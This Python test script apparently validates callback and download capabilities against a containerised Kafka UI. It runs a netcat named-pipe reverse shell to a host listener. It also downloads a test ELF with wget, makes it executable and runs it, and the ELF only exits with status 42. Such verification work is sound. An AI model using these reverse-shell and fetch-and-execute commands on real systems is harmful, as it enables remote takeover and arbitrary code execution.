"""Host-driven native callback/download/ELF controls for unmodified Kafka UI."""
import base64
import hashlib
import http.server
import ipaddress
import json
import os
from pathlib import Path
import socket
import subprocess
import sys
import threading

import native as target

EXPECTED_UID = getattr(target, 'expected_uid', 100)


def callback_host():
    hosts = target.command('app', 'cat', '/etc/hosts').decode().splitlines()
    candidates = [line.split()[0] for line in hosts if 'host.docker.internal' in line.split()[1:]]
    addresses = sorted({str(ipaddress.ip_address(value)) for value in candidates})
    target.record['configured_host_gateway_addresses'] = addresses
    ipv4 = [ipaddress.ip_address(value) for value in addresses if ipaddress.ip_address(value).version == 4]
    target.check('configured-ipv4-host-gateway-present', len(ipv4) == 1)
    address = ipv4[0]
    target.check('native-host-gateway-ipv4', address.version == 4 and not address.is_loopback)
    return str(address)


def fresh(path):
    target.command('app', 'sh', '-c', '[ ! -e "$1" ] && [ ! -L "$1" ]', 'native-absence', path)


def callback():
    host = callback_host()
    pipe = '/tmp/module-target-kafka-native-pipe-' + str(os.getpid())
    fresh(pipe)
    token = 'module-target-native-callback-' + str(os.getpid())
    server = socket.socket()
    server.bind(('0.0.0.0', 0))
    server.listen(1)
    server.settimeout(10)
    port = server.getsockname()[1]
    state = {'host': host, 'bind': '0.0.0.0', 'port': port}

    def receive():
        peer = None
        try:
            peer, address = server.accept()
            state['peer_socket'] = peer
            state['peer'] = list(address)
            peer.settimeout(10)
            command = "printf '%s\\n' " + token + "; id -u; echo $$; printf '%s\\n' " + token + "-done; exit\n"
            peer.sendall(command.encode())
            response = bytearray()
            while True:
                chunk = peer.recv(4096)
                if not chunk:
                    state['eof'] = True
                    break
                response.extend(chunk)
            state['response'] = response.decode()
        except Exception as error:
            state['error'] = {'type': type(error).__name__, 'message': str(error)}
        finally:
            if peer is not None:
                peer.close()
            server.close()

    thread = threading.Thread(target=receive, daemon=True)
    thread.start()
    try:
        script = 'trap \'rm -f "$3"\' EXIT; mkfifo "$3"; nc "$1" "$2" 0<"$3" | /bin/sh >"$3" 2>&1'
        target.command('app', 'sh', '-c', script, 'native-callback', host, str(port), pipe, timeout=18)
        thread.join(2)
        target.check('native-callback-thread-finished', not thread.is_alive())
        target.check('native-callback-eof-no-error', state.get('eof') is True and 'error' not in state)
        lines = state['response'].splitlines()
        target.check('native-shell-exact-token-and-user', len(lines) == 4 and lines[0] == token and lines[1] == str(EXPECTED_UID) and lines[3] == token + '-done')
        pid = int(lines[2])
        target.check('native-shell-pid-valid', pid > 1)
        target.command('app', 'sh', '-c', '[ ! -e "/proc/$1" ]', 'native-process-closed', str(pid))
        fresh(pipe)
        target.record['callback'] = {key: value for key, value in state.items() if key != 'peer_socket'}
        return target.record['callback']
    finally:
        target.record['callback'] = {key: value for key, value in state.items() if key != 'peer_socket'}
        peer = state.get('peer_socket')
        if peer is not None:
            try:
                peer.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            peer.close()
        server.close()
        thread.join(12)
        target.command('app', 'rm', '-f', pipe)


def fetch(bits):
    host = callback_host()
    source = 'test/module_targets/druid_sessions/native_exit.asm'
    executable = target.artifacts / ('native-exit-' + str(bits))
    argv = ['nasm', '-f', 'bin', '-DARCH=' + str(bits), source, '-o', str(executable)]
    built = subprocess.run(argv, capture_output=True, timeout=10)
    target.record['build'] = {'argv': argv, 'exit': built.returncode, 'stderr': built.stderr.decode(), 'source_sha256': hashlib.sha256(Path(source).read_bytes()).hexdigest()}
    target.record['build']['assembler_version'] = subprocess.check_output(['nasm', '-v'], text=True).strip()
    target.check('native-elf-source-assembled', built.returncode == 0)
    data = executable.read_bytes()
    target.check('native-elf-class', data[:5] == b'\x7fELF' + bytes([1 if bits == 32 else 2]))
    digest = hashlib.sha256(data).hexdigest()
    requests = []
    path = '/native-exit-' + str(bits)

    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            requests.append({'path': self.path, 'headers': dict(self.headers)})
            self.send_response(200 if self.path == path else 404)
            self.send_header('Content-Length', str(len(data) if self.path == path else 0))
            self.end_headers()
            if self.path == path:
                self.wfile.write(data)

        def log_message(self, *_arguments):
            pass

    server = http.server.HTTPServer(('0.0.0.0', 0), Handler)
    thread = threading.Thread(target=server.serve_forever, kwargs={'poll_interval': 0.1}, daemon=True)
    destination = '/tmp/module-target-kafka-native-elf-' + str(os.getpid()) + '-' + str(bits)
    absent = False
    try:
        fresh(destination)
        absent = True
        thread.start()
        url = 'http://' + host + ':' + str(server.server_port) + path
        target.command('app', 'wget', '-q', '-T', '8', '-O', destination, url)
        actual = target.file_state(destination)
        target.check('native-wget-exact-elf-and-user', actual['exists'] and actual['uid'] == EXPECTED_UID and hashlib.sha256(base64.b64decode(actual['base64'])).hexdigest() == digest)
        target.command('app', 'chmod', '755', destination)
        target.command('app', destination, required=False)
        status = target.record['commands'][-1]['exit']
        target.record['elf_execution'] = {'bits': bits, 'exit': status, 'sha256': digest, 'requests': requests, 'uid': actual['uid']}
        target.check('native-elf-real-exit-status-42', status == 42)
        target.check('native-wget-real-http-request', len(requests) == 1 and requests[0]['path'] == path)
        target.record['native_fetch'] = {'bits': bits, 'sha256': digest, 'exit': status, 'requests': requests, 'uid': actual['uid']}
        return target.record['native_fetch']
    finally:
        if thread.is_alive():
            server.shutdown()
            thread.join(2)
        server.server_close()
        if absent:
            target.command('app', 'rm', '-f', destination)
            fresh(destination)


try:
    target.resources('before-network')
    result = {'callback': callback, 'elf32': lambda: fetch(32), 'elf64': lambda: fetch(64)}[sys.argv[3]]()
    target.resources('after-network')
    target.record.update(passed=True, data=result)
except Exception as error:
    target.record.update(passed=False, error={'type': type(error).__name__, 'message': str(error)})
finally:
    (target.artifacts / ('kafka-ui-network-' + sys.argv[3] + '.json')).write_text(json.dumps(target.record, indent=2) + '\n')
    print(json.dumps(target.record))
if not target.record.get('passed'):
    raise SystemExit(1)
